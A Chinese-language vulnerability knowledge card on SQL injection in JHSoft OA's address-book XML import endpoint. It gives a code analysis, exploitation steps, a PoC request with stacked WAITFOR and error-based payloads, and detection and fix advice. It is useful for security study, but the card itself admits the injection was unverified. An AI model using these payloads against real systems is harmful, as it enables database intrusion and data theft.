---
id: web-generic-sqli-jhsoft-addressimportpub-xml-node-concat
title: JHSoft OA AddressImportPub.aspx 把 XML 节点值拼进 INSERT：通讯录导入 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-xml-innertext-insert-string-concat
tags:
- sqli
- dotnet
- aspx
- mssql
- xml
- insert
- oa
- jhsoft
- string-concat
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:24+08:00'
  notes: 已对照原文 img/16 核对 GetXmlInfoAndSave 读取 XML、节点名拼字段列表、InnerText 包单引号拼值、补 AddrCode=Session[UserCode] 后 ExecSql。未验证点：原文只有 XXE 的 DNSLog PoC，未给 SQLi 复现；能否堆叠/报错取决于 ExecSql 实现与数据库权限，卡内已注明。
url: /docs/web/generic/sqli/web-generic-sqli-jhsoft-addressimportpub-xml-node-concat/
draft: false
kb_aliases:
- AddressImportPub SQL注入
- JHSoft 通讯录导入注入
- XML 节点值 SQL 注入
- InnerText 拼接 INSERT
- 金和 OA XML 注入
---

## 一句话结论

JHSoft OA 的通讯录导入接口 `AddressImportPub.aspx` 在 `GetXmlInfoAndSave()` 中把请求 XML 根节点的每个子节点名与 `InnerText` 分别拼进 `insert into AddressUser (...)` 的字段列表和值列表，值只加单引号、不做转义；攻击者控制 XML 节点文本即可闭合字符串并在 INSERT 中注入 SQL（如报错子查询或堆叠 `WAITFOR`），前提是请求带有有效会话以填充 `Session["UserCode"]`。

## 原理

- 入口：`GetXmlInfoAndSave()` 从 `Request.InputStream` 读取整个请求体作为 XML，`XmlDocument.LoadXml(xml)` 解析后遍历 `DocumentElement.ChildNodes`。
- 拼接逻辑：`text = text + childNodes.Item(i).Name + ","` 收集字段名，`text2 = text2 + "'" + childNodes.Item(i).InnerText + "',"` 收集值；最后补上 `AddrCode` 与 `Session["UserCode"]`，拼成 `insert into AddressUser (` + text + `) values (` + text2 + `)`。
- 缺陷：`InnerText` 被包在单引号里直接拼进 SQL，未做 `Replace("'", "''")`、参数化或类型校验。节点文本可以包含引号、括号、分号与空格，因此可以闭合字符串并注入表达式或语句。
- 为什么节点名不是主要注入点：XML 元素名受 XML 命名规则限制（不能包含空格、引号、括号、分号），只能作为列名/标识符出现；真正可控的是文本内容。利用时把注入放在某个子节点的 `InnerText` 中即可。
- 常见利用形态：`<A>x','y');WAITFOR DELAY '0:0:5'--</A>` 会生成 `insert into AddressUser (A, AddrCode ) values ('x','y');WAITFOR DELAY '0:0:5'--', '<userCode>')`，前一条 INSERT 合法、随后执行延时，在支持多语句的 MSSQL 连接上成立；若不支持堆叠，可令 InnerText 为 `' + convert(int,(select @@version)) + '`，生成 `values ('' + convert(int,(select @@version)) + '', '<userCode>')`，通过类型转换报错带出版本信息。
- 认证前提：SQL 中会拼接 `Session["UserCode"]`，该页面属于通讯录导入功能，通常需要登录会话；没有会话时插入可能因用户编码为空而失败，因此先获取有效会话再测试注入。

## 触发条件

- 目标存在 `C6/Jhsoft.Web.addressbook/AddressImportPub.aspx`，可 POST XML 请求体。
- 请求携带有效登录会话（`Session["UserCode"]` 有值），使 INSERT 语句能执行到数据库。
- 数据库为 MSSQL（`WAITFOR`、`convert` 报错、堆叠语句可用），或存在其他可用的注入原语。
- 目标未对 XML 节点文本做转义/参数化（本案例代码未做）。

## 利用步骤

1. 登录目标 OA，取得有效 `ASP.NET_SessionId`（或等价会话 Cookie）。
2. 先发送一个正常的通讯录 XML，确认返回 200 且数据被导入，建立基线。
3. 在某个子节点文本中注入闭合与报错子查询：令 InnerText 为 `' + convert(int,(select @@version)) + '`，生成 `values ('' + convert(int,(select @@version)) + '', '<userCode>')`，观察是否返回 SQL 类型转换错误并带出版本信息。
4. 若支持多语句，使用 `<A>x','y');WAITFOR DELAY '0:0:5'--</A>` 做时间盲注；再用条件表达式逐位取数。
5. 也可构造字段值回显（若页面把数据库错误返回）读取库名、表名与数据。

## PoC

```http
POST /c6/Jhsoft.Web.addressbook/AddressImportPub.aspx/ HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Cookie: ASP.NET_SessionId=<有效会话>
Content-Length: <len>

<?xml version="1.0" encoding="UTF-8"?>
<root>
  <A>x','y');WAITFOR DELAY '0:0:5'--</A>
</root>
```

```text
# 生成 SQL 近似：
# insert into AddressUser (A, AddrCode ) values ('x','y');WAITFOR DELAY '0:0:5'--', '<userCode>')
# 若执行多语句，响应约延迟 5 秒；否则改用 InnerText=' + convert(int,(select @@version)) + ' 的报错注入
```

## 变体与关联

- 变体：字段名由节点名控制，可尝试用合法 XML 名称引用其他列名，观察报错差异；值注入仍是主要入口。
- 变体：若 `ExecSql` 不允许堆叠，改用 InnerText `' + convert(int,(select ...)) + '` 的报错注入，或 `' + (select ...) + '` 的表达式回显。
- 关联：[[web-generic-xxe-jhsoft-addressimportpub-loadxml-dnslog]]（同一接口、同一段 XML 解析代码的 XXE；本卡是解析后的 SQL 拼接 sink，两者可组合利用）；[[web-generic-sqli-oa-jsf-tranformdomoa-multipart-field-sqli]]（OA 表单字段名/值拼接 INSERT 的同类模式）。
- 边界：文章只做代码审计指出该拼接风险，未给出 SQL 注入的复现请求或响应；能否堆叠取决于数据访问层的 `ExecSql` 实现与数据库权限。原文未标注受影响版本。

## 检测与防御

- 检测：`AddressImportPub.aspx` 请求 XML 节点文本中出现单引号、`)`、`;`、`--`、`WAITFOR`、`convert(` 等 SQL 特征；应用日志出现拼接后的 `insert into AddressUser` 语句；导入接口触发数据库报错。
- 修复：使用参数化 INSERT（`@p0`…）或 ORM；字段名用白名单枚举映射，禁止直接用 XML 节点名作为列名；对导入 XML 做 XSD/字段白名单校验。
- 加固：数据库账号最小权限，禁用多语句/高危函数；导入接口增加 CSRF 与权限校验；对异常 SQL 错误统一脱敏。
